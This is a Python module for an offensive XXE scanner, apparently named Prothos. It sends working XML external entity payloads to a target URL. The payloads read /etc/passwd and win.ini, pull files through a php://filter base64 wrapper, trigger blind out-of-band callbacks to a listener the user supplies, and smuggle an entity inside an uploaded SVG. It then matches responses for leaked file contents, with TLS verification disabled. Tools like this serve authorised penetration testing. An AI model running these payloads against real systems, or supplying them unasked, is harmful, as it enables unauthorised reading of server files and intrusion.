import asyncio
import json
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

PASSWD_RE = re.compile(r"root:.*?:0:0:", re.IGNORECASE)
WININI_RE = re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.IGNORECASE)

CLASSIC_PAYLOADS: list[dict] = [
    {"name": "Classic file:///etc/passwd",
     "body": '<?xml version="1.0" encoding="UTF-8"?>'
             '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<root>&xxe;</root>'},
    {"name": "Classic win.ini",
     "body": '<?xml version="1.0"?>'
             '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
             '<root>&xxe;</root>'},
    {"name": "PHP filter base64",
     "body": '<?xml version="1.0"?>'
             '<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>'
             '<root>&xxe;</root>'},
    {"name": "Nested entity",
     "body": '<?xml version="1.0"?>'
             '<!DOCTYPE root [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY b "%a;">]>'
             '<root>&b;</root>'},
    {"name": "Generic wrapper",
     "body": '<?xml version="1.0"?>'
             '<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>'
             '<data><value>&file;</value></data>'},
]

PARAM_ENTITY_TEMPLATE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY % ext SYSTEM "{oob}"> %ext;]>'
    '<root>test</root>'
)

BLIND_OOB_TEMPLATE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "{oob}">]>'
    '<root>&xxe;</root>'
)

SVG_XXE_TEMPLATE = (
    '<?xml version="1.0" standalone="yes"?>'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">'
    '<text x="10" y="20">&xxe;</text></svg>'
)

XML_CONTENT_TYPES: list[str] = [
    "application/xml", "text/xml", "application/soap+xml",
    "application/xhtml+xml", "application/rss+xml",
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class XXEFinding:
    url:        str
    technique:  str
    vector:     str
    status:     int          = 0
    evidence:   str          = ""
    severity:   str          = "critical"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class XXEReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    xml_accepting: bool              = False
    findings:    list[XXEFinding]    = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def critical(self) -> list[XXEFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _extracted(body: str) -> Optional[str]:
    m = PASSWD_RE.search(body)
    if m:
        return f"/etc/passwd: {m.group(0)}"
    m = WININI_RE.search(body)
    if m:
        return f"win.ini: {m.group(0)}"
    return None


async def _detect_xml(client, url) -> bool:
    probe = '<?xml version="1.0"?><prothos>ping</prothos>'
    for ct in XML_CONTENT_TYPES[:2]:
        try:
            r = await client.post(url, content=probe, headers={"Content-Type": ct}, timeout=10)
            if r.status_code < 500 and r.status_code not in (404, 405, 415):
                return True
            if "xml" in r.text.lower() or r.status_code == 400:
                return True
        except Exception:
            continue
    return False


async def _test_classic(client, url, sem) -> list[XXEFinding]:
    findings = []
    async with sem:
        for ct in XML_CONTENT_TYPES[:3]:
            for payload in CLASSIC_PAYLOADS:
                try:
                    r = await client.post(url, content=payload["body"],
                                          headers={"Content-Type": ct}, timeout=12)
                except Exception:
                    continue
                evidence = _extracted(r.text)
                if evidence:
                    f = XXEFinding(url=url, technique="classic", vector=payload["name"],
                                   status=r.status_code, evidence=evidence, severity="critical")
                    findings.append(f)
                    _print_finding(f)
                    return findings
    return findings


async def _test_param_entity(client, url, oob, sem) -> list[XXEFinding]:
    findings = []
    if not oob:
        return findings
    async with sem:
        body = PARAM_ENTITY_TEMPLATE.format(oob=oob)
        try:
            await client.post(url, content=body,
                              headers={"Content-Type": "application/xml"}, timeout=10)
            f = XXEFinding(url=url, technique="parameter-entity", vector="external param entity",
                           status=0, evidence=f"param entity sent to {oob}, check OOB listener",
                           severity="high")
            findings.append(f)
            _print_finding(f)
        except Exception:
            pass
    return findings


async def _test_blind(client, url, oob, sem) -> list[XXEFinding]:
    findings = []
    if not oob:
        return findings
    async with sem:
        body = BLIND_OOB_TEMPLATE.format(oob=oob)
        try:
            await client.post(url, content=body,
                              headers={"Content-Type": "application/xml"}, timeout=10)
            f = XXEFinding(url=url, technique="blind-oob", vector="SYSTEM entity callback",
                           status=0, evidence=f"blind XXE sent to {oob}, check OOB listener",
                           severity="high")
            findings.append(f)
            _print_finding(f)
        except Exception:
            pass
    return findings


async def _test_upload(client, url, upload_field, sem) -> list[XXEFinding]:
    findings = []
    async with sem:
        files = {upload_field: ("prothos.svg", SVG_XXE_TEMPLATE, "image/svg+xml")}
        try:
            r = await client.post(url, files=files, timeout=12)
        except Exception:
            return findings
        evidence = _extracted(r.text)
        if evidence:
            f = XXEFinding(url=url, technique="file-upload", vector="SVG with XXE",
                           status=r.status_code, evidence=evidence, severity="critical")
            findings.append(f)
            _print_finding(f)
    return findings


def _print_finding(f: XXEFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.technique}[/bold white] → "
        f"[yellow]{f.vector}[/yellow]  "
        f"[dim]{f.evidence[:50]}[/dim]"
    )


def _display(report: XXEReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]xml endpoint:[/dim] {'yes' if report.xml_accepting else 'unknown'}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]",
        title="[bold red]XXE Scan — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No XXE found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Technique", style="cyan", width=18)
    table.add_column("Vector",    style="bold white", width=22)
    table.add_column("Status",    style="dim", width=7)
    table.add_column("Evidence",  style="yellow", min_width=25)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.technique, f.vector, str(f.status) if f.status else "-", f.evidence[:40],
        )

    console.print(table)
    console.print()


async def _xxe_async(target, oob, upload_field, concurrency, proxy) -> XXEReport:
    report = XXEReport(target=target)
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Scanning XXE...", total=None)

            report.xml_accepting = await _detect_xml(client, target)
            report.findings.extend(await _test_classic(client, target, sem))
            report.findings.extend(await _test_blind(client, target, oob, sem))
            report.findings.extend(await _test_param_entity(client, target, oob, sem))
            report.findings.extend(await _test_upload(client, target, upload_field, sem))
            progress.update(task_id, completed=1, total=1)

    report.findings.sort(key=lambda x: (
        {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.severity, 4)
    ))
    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_xxe_scan(
    target:        str,
    oob_url:       Optional[str]  = None,
    upload_field:  str            = "file",
    concurrency:   int            = 6,
    proxy:         Optional[str]  = None,
    save_json:     Optional[str]  = None,
) -> XXEReport:

    console.print(f"\n[bold red][*][/bold red] XXE Scan → [bold white]{target}[/bold white]")
    console.print(f"[dim]    Techniques: classic, blind-oob, param-entity, file-upload  "
                  f"OOB: {'on' if oob_url else 'off'}[/dim]")

    report = asyncio.run(_xxe_async(
        target=target,
        oob=oob_url,
        upload_field=upload_field,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
